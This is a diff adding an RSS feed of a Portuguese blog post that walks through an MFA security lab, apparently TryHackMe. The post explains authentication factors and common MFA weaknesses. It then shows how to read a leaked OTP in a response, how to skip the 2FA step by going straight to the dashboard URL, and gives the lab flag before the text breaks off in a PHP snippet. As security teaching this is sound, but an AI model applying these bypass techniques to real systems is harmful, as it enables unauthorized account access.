@@ -1,0 +1,393 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Alex Paulino – Authentication</title>
+    <link>http://localhost:1313/tags/authentication/</link>
+    <description>Recent content in Authentication on Alex Paulino</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>pt</language>
+    <lastBuildDate>Mon, 03 Feb 2025 18:53:00 -0300</lastBuildDate>
+    
+	  <atom:link href="http://localhost:1313/tags/authentication/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+      
+        
+      
+    
+    
+    <item>
+      <title>Multi-Factor Authentication</title>
+      <link>http://localhost:1313/posts/2025/2025-02-03-mfa/</link>
+      <pubDate>Mon, 03 Feb 2025 18:53:00 -0300</pubDate>
+      
+      <guid>http://localhost:1313/posts/2025/2025-02-03-mfa/</guid>
+      <description>
+        
+        
+        &lt;h2 data-hextra-search-id=&#34;introdução&#34;&gt;Introdução&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;introdução&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#introdu%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Multi-Factor Authentication (MFA) tem uma papel importante em aplicações modernas, adicionando uma camada extra de proteção contra ataques. MFA utiliza diferentes combinações, por exemplo:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Senha.&lt;/li&gt;
+&lt;li&gt;Algo que você tem (celular).&lt;/li&gt;
+&lt;li&gt;Algo que você possui (biometria).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;O objetivo da aula é entender melhor, os conceitos de MFA, como também sua importância no fortalecimento da segurança. Além de explorar diferentes tipos de fatores de autenticação utilizando MFA, ao final da aula teremos um melhor entendimento sobre essa tecnologia, através de estudo em cenários práticos onde o MFA é implementado para proteger informações sensíveis.&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;como-mfa-funciona&#34;&gt;Como MFA funciona&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;como-mfa-funciona&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#como-mfa-funciona&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;É importante saber que o 2FA (segundo fator de autenticação) faz parte do MFA, quando dizemos MFA estamos nos referindo ao processo de autenticação, que solicita dois ou mais fatores para verificar a identidade.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;tipo-de-fator-de-autenticação&#34;&gt;Tipo de fator de autenticação&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;tipo-de-fator-de-autenticação&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#tipo-de-fator-de-autentica%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;MFA combina dois os mais tipos de credenciais, para realizar a autenticação, são eles:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Conhecimento&lt;/code&gt;: senha, PIN, ou outra coisa que você lembra.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Posse&lt;/code&gt;: smartcard, celular com app de autenticação, etc.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Herança&lt;/code&gt;: biometrica, íris, impressões digitais.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Localização&lt;/code&gt;: geolocalização, IP de origem.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Comportamento&lt;/code&gt;: aplicação analisa o comportamento do usuário, para restringir interações de bot.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;2FA utiliza dois tipos de fatores, dos citados acima, todo 2FA é um MFA, porém nem todo MFA é um 2FA.&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;tipos-de-2fa&#34;&gt;Tipos de 2FA&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;tipos-de-2fa&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#tipos-de-2fa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;2FA pode utilizar vários mecanismos para garantir que cada fator de autenticação forneça uma camada de segurança robusta. Alguns dos métodos mais comuns incluem:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Time-Based One Time Passwords (TOTP)&lt;/strong&gt;: senhas temporárias que são trocadas a cada 30 segundos ou mais.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Push Notifications&lt;/strong&gt;: aplicativos como DUO ou Google Prompt enviam uma solicitação de login para celular.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SMS&lt;/strong&gt;: a maioria dos aplicativos utilizam esse método, o sistema envia uma mensagem de texto com um código temporário para o número de celular do usuário.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Hardware Tokens&lt;/strong&gt;: dispositivos com YubiKeys geram um &lt;em&gt;one-time passcode&lt;/em&gt; ou utilizam autenticação por NFC.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 data-hextra-search-id=&#34;acesso-condicional&#34;&gt;Acesso Condicional&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;acesso-condicional&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#acesso-condicional&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O acesso condicional é normalmente usado por empresas para ajustar os requisitos de autenticação com base em diferentes contextos. É como uma árvore de decisão que aciona verificações de segurança extras dependendo de certas condições. Por exemplo:&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;baseado-na-localização&#34;&gt;Baseado na Localização&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;baseado-na-localização&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#baseado-na-localiza%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Se o usuário está acessando o sistema, do local habitual que já acessa, é solicitado somente as credenciais de acesso. Caso esteja em algum outro local, o sistema pode solicitar outras verificações: OTP ou biometria .&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;baseado-em-tempo&#34;&gt;Baseado em Tempo&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;baseado-em-tempo&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#baseado-em-tempo&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Durante um acesso em horário regular de trabalho, o sistema pode solicitar apenas as credenciais de acesso. Em horário fora do expediente, pode ser adicionado uma cama extra de segurança, como por exemplo: OTP ou tokens de segurança.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;análise-por-comportamento&#34;&gt;Análise por Comportamento&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;análise-por-comportamento&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#an%c3%a1lise-por-comportamento&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Suponha que o comportamento de um usuário mude repentinamente, como se ele começasse a acessar dados que normalmente não visualiza ou acessa em horários estranhos. Nesse caso, o sistema pode pedir autenticação adicional para confirmar que é realmente ele.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;adoção-global-e-impulso-regulatório&#34;&gt;Adoção Global e Impulso Regulatório&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;adoção-global-e-impulso-regulatório&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#ado%c3%a7%c3%a3o-global-e-impulso-regulat%c3%b3rio&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A adoção do MFA está se expandindo rapidamente em vários setores devido à sua eficácia na proteção contra muitas ameaças comuns de segurança, incluindo phishing, engenharia social e ataques baseados em senha. Governos e indústrias em todo o mundo estão reconhecendo a importância do MFA e estão começando a exigir seu uso por meio de várias estruturas regulatórias. Por exemplo, os setores financeiro e de saúde agora estão implementando requisitos rigorosos de MFA para cumprir com regulamentações como GDPR na Europa, HIPAA nos Estados Unidos e PCI-DSS para sistemas de pagamento globalmente.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;pergunta&#34;&gt;Pergunta&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;pergunta&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pergunta&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;When logging in to the application, you receive an SMS on your phone containing the OTP. What authentication factor is this?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;Something you have&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;implementações-e-aplicações&#34;&gt;Implementações e Aplicações&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;implementações-e-aplicações&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#implementa%c3%a7%c3%b5es-e-aplica%c3%a7%c3%b5es&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;A autenticação multifator (MFA) é agora um fator importante para manter nossas atividades online e offline protegidas de agentes de ameaças&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;mfa-bancos&#34;&gt;MFA Bancos&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;mfa-bancos&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#mfa-bancos&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Os bancos lidam com informações e transações incrivelmente sensíveis todos os dias. Ao usar o MFA, os bancos podem proteger as informações pessoais e financeiras dos usuários contra roubo cibernético, fraude e outras ameaças online. Normalmente, os bancos pedem que você insira uma senha (algo que você sabe) antes de passar para uma segunda camada de segurança, que é um código enviado por SMS ou gerado por um aplicativo no seu telefone (algo que você tem). Dessa forma, mesmo que alguém tenha sua senha, ele ainda precisará dessa informação extra para acessar sua conta ou concluir uma transação.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;mfa-em-saúde&#34;&gt;MFA em Saúde&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;mfa-em-saúde&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#mfa-em-sa%c3%bade&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Na área da saúde, devido a regulamentações como a HIPAA nos EUA, a MFA garante que os registros de pacientes e informações pessoais de saúde sejam acessíveis apenas por pessoas autorizadas. Por exemplo, para acessar sistemas sensíveis como registros eletrônicos de saúde (EHRs), os provedores de saúde podem exigir que um médico use um crachá de segurança (algo que eles têm) e uma digitalização de impressão digital (algo que eles são). Isso garante que apenas aqueles com as credenciais corretas possam visualizar ou alterar os dados do paciente.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;mfa-em-ti-corporativa&#34;&gt;MFA em TI Corporativa&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;mfa-em-ti-corporativa&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#mfa-em-ti-corporativa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Com o número crescente de ataques cibernéticos e violações de dados, os departamentos de TI no mundo corporativo estão sob intensa pressão para proteger dados comerciais confidenciais e manter a integridade do sistema. O MFA ajuda a mitigar o risco de acesso não autorizado que pode levar ao roubo de dados, espionagem ou sabotagem. Em um ambiente corporativo, o MFA é normalmente usado ao acessar redes, bancos de dados e serviços de nuvem da empresa. Os funcionários podem primeiro fazer login com suas credenciais corporativas (algo que eles sabem) e, em seguida, verificar sua identidade com um código enviado para o telefone fornecido pela empresa (algo que eles têm) ou por meio de verificação biométrica (algo que eles são). Dessa forma, mesmo que alguém tente atacar seu sistema, eles encontrarão um obstáculo sem o segundo fator.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;pergunta-1&#34;&gt;Pergunta&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;pergunta-1&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pergunta-1&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Is MFA an important factor in keeping our online and offline activities safe from threat actors? (yea/nay)&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;yea&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;vulnerabilidades-comuns-em-mfa&#34;&gt;Vulnerabilidades comuns em MFA&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerabilidades-comuns-em-mfa&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerabilidades-comuns-em-mfa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3 data-hextra-search-id=&#34;fraqueza-no-algoritmo-de-geração-do-otp&#34;&gt;Fraqueza no Algoritmo de Geração do OTP&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;fraqueza-no-algoritmo-de-geração-do-otp&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#fraqueza-no-algoritmo-de-gera%c3%a7%c3%a3o-do-otp&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A segurança de uma Senha Única (OTP) é tão forte quanto o algoritmo usado para criá-la. Se o algoritmo for fraco ou muito previsível, ele pode facilitar o trabalho do invasor tentando adivinhar a OTP.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;aplicativo-vazando-o-token-2fa&#34;&gt;Aplicativo Vazando o Token 2FA.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;aplicativo-vazando-o-token-2fa&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#aplicativo-vazando-o-token-2fa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Devido à codificação insegura, alguns aplicativos também podem vazar o token 2FA na resposta. Um cenário comum é quando um usuário, após o login, chega à página 2FA, o aplicativo acionará uma solicitação XHR para um endpoint que emite o OTP. Às vezes, essa solicitação XHR retorna o OTP de volta para o usuário dentro da resposta HTTP.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;brute-forcing-em-otp&#34;&gt;Brute Forcing em OTP&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;brute-forcing-em-otp&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#brute-forcing-em-otp&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Embora OTPs sejam projetados para uso único, eles não são imunes a ataques de força bruta. Se um invasor puder fazer suposições ilimitadas, ele pode eventualmente obter o OTP correto, especialmente se o OTP não estiver bem protegido por medidas de segurança adicionais.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;falta-de-limitação-de-taxa&#34;&gt;Falta de limitação de taxa&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;falta-de-limitação-de-taxa&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#falta-de-limita%c3%a7%c3%a3o-de-taxa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Sem limitação de taxa adequada, um aplicativo fica aberto a invasores para continuar tentando diferentes OTPs sem dificuldade. Se um invasor puder enviar vários palpites em um curto período de tempo, isso aumenta a probabilidade de que o invasor consiga obter o OTP correto.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;uso-do-evilginx&#34;&gt;Uso do Evilginx&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;uso-do-evilginx&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#uso-do-evilginx&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Evilginx é uma ferramenta que é tipicamente usada &lt;em&gt;red teams&lt;/em&gt;. Como pode ser usada para executar ataques de phishing sofisticados, efetivamente ignorando a Autenticação Multifator (MFA). Ela opera como um proxy man-in-the-middle que pode interceptar e redirecionar OTPs destinados a usuários legítimos.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;pergunta-2&#34;&gt;Pergunta&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;pergunta-2&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pergunta-2&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;What can be implemented to help prevent brute-forcing OTPs?&lt;/strong&gt;&lt;br&gt;
+Resposta: &lt;code&gt;rate limiting&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;vazamento-de-otp---prática&#34;&gt;Vazamento de OTP - Prática&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vazamento-de-otp---prática&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vazamento-de-otp---pr%c3%a1tica&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Vazamento de token OTP em uma resposta XHR (XMLHttpRequest) ocorre devido a uma implementação incorreta no 2FA ou codificação insegura. Algumas razões comuns por que isso ocorre são:&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;validação-server-side--ou-retorno-de-dados-sensíveis&#34;&gt;Validação Server-Side  ou retorno de dados sensíveis&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;validação-server-side--ou-retorno-de-dados-sensíveis&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#valida%c3%a7%c3%a3o-server-side--ou-retorno-de-dados-sens%c3%adveis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Em alguns aplicativos mal projetados, o servidor valida o OTP e, em vez de apenas confirmar o sucesso ou a falha, ele retorna o próprio OTP na resposta. Isso geralmente é feito de forma não intencional, como parte de depuração, registro ou práticas inadequadas de tratamento de respostas.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;falta-de-práticas-de-segurança-adequadas&#34;&gt;Falta de práticas de segurança adequadas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;falta-de-práticas-de-segurança-adequadas&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#falta-de-pr%c3%a1ticas-de-seguran%c3%a7a-adequadas&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Os desenvolvedores podem ignorar as implicações de segurança de expor informações sensíveis como OTP nas respostas da API. Isso geralmente acontece quando os desenvolvedores estão focados em tornar o aplicativo funcional sem considerar como os invasores podem explorar essas respostas.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;depuração-de-informações-deixadas-na-produção&#34;&gt;Depuração de informações deixadas na produção&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;depuração-de-informações-deixadas-na-produção&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#depura%c3%a7%c3%a3o-de-informa%c3%a7%c3%b5es-deixadas-na-produ%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Durante o processo de desenvolvimento e teste, os desenvolvedores deixam mensagem de depuração, tornado-o assim o desenvolvimento mais fácil para identificar possíveis falhas ou bug, o problema é que muitas vezes essas informações não são removidas no software que será usado em produção. Se essas respostas de depuração não forem removidas antes da implantação na produção, informações confidenciais, como OTPs, poderão ser expostas.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;exploração&#34;&gt;Exploração&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;exploração&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#explora%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Acessar o endereço: &lt;code&gt;http://mfa.thm/labs/first&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Credenciais de acesso:&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th style=&#34;text-align: center&#34;&gt;Username&lt;/th&gt;
+					&lt;th&gt;Password&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;&lt;a
+    href=&#34;mailto:thm@mail.thm&#34;&gt;thm@mail.thm&lt;/a&gt;&lt;/td&gt;
+					&lt;td&gt;test123&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Antes de realizar o login devemos abrir a ferramenta de desenvolvedor Web do navegador (F12).
+Na aba de &amp;ldquo;Network&amp;rdquo; iremos acompanhar todas requisições, depois que clicarmos em &amp;ldquo;Login&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/MFA/leak-otp.png&#34; alt=&#34;Leak OTP&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;O token OTP é vazado na resposta HTTP, com isso conseguimos acessar a aplicação.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/MFA/flag-lab1.png&#34; alt=&#34;Flag lab1&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the flag in the dashboard?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;904c8ac84e44f0ba942e9e11ee7037b8&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;codificação-insegura---prática&#34;&gt;Codificação Insegura - Prática&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;codificação-insegura---prática&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#codifica%c3%a7%c3%a3o-insegura---pr%c3%a1tica&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3 data-hextra-search-id=&#34;falha-lógica-ou-codificação-insegura&#34;&gt;Falha lógica ou codificação insegura?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;falha-lógica-ou-codificação-insegura&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#falha-l%c3%b3gica-ou-codifica%c3%a7%c3%a3o-insegura&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Em alguns aplicativos, lógica falha ou práticas de codificação inseguras podem levar a uma situação em que partes críticas do aplicativo (por exemplo, o painel) podem ser acessadas sem concluir totalmente o processo de autenticação. Especificamente, um invasor pode ser capaz de ignorar o mecanismo 2FA completamente e obter acesso ao painel ou outras áreas sensíveis sem inserir o OTP (One-Time Password). Isso geralmente ocorre devido ao gerenciamento de sessão inadequado, verificações de controle de acesso deficientes ou lógica implementada incorretamente que não consegue impor o requisito 2FA.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;exploração-1&#34;&gt;Exploração&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;exploração-1&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#explora%c3%a7%c3%a3o-1&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Para autenticamos na aplicação usaremos as mesmas credenciais do exercício anterior.
+Laboratório:&lt;code&gt;http://mfa.thm/labs/second/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/MFA/verification-otp-lab2.png&#34; alt=&#34;OTP lab2&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Após informar as credenciais, somos redirecionado para a verificação de OTP.
+Porém, se alterarmos nossa URL para &lt;code&gt;dashboard&lt;/code&gt; conseguimos &lt;em&gt;bypassed&lt;/em&gt; a verificação de segurança, dessa forma não precisamos informar o token.
+Exemplo: &lt;code&gt;http://mfa.thm/labs/second/dashboard&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/MFA/flag-lab2.png&#34; alt=&#34;Flag lab2&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;se-profundando-no-código&#34;&gt;Se profundando no código&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;se-profundando-no-código&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#se-profundando-no-c%c3%b3digo&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Function that verifies the submitted 2FA token
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;verify_2fa_code&lt;/span&gt;($code) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;token&amp;#39;&lt;/span&gt;]))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $code &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;token&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Function called in the /mfa page
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;verify_2fa_code&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;code&amp;#39;&lt;/span&gt;])) { &lt;span style=&#34;color:#75715e&#34;&gt;#If successful, the user will be redirected to the dashboard.
